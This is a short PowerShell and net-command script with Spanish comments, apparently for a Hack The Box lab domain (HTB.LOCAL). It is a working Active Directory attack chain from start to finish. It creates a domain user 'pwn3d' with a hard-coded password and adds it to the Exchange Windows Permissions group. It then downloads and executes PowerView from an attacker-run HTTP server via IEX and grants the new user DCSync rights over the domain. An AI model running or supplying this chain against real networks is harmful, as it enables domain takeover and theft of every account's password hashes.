# ==============================
# Propósito: Crear usuario pwn3d:pwn123, agregar a Exchange Windows Permissions y otorgar permisos DCSync
# ==============================

# 1️⃣ Crear usuario de dominio
net user pwn3d pwn3d123! /add /domain

# 2️⃣ Agregar usuario al grupo "Exchange Windows Permissions"
net group "Exchange Windows Permissions" pwn3d /add /domain

# 3️⃣ Preparar credenciales para PowerView
$SecPassword = ConvertTo-SecureString 'pwn3d123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\pwn3d', $SecPassword)

# 4️⃣ Descargar PowerView desde tu servidor HTTP
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.7/PowerView.ps1')

# 5️⃣ Otorgar permisos DCSync sobre el dominio
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity pwn3d -Rights DCSync

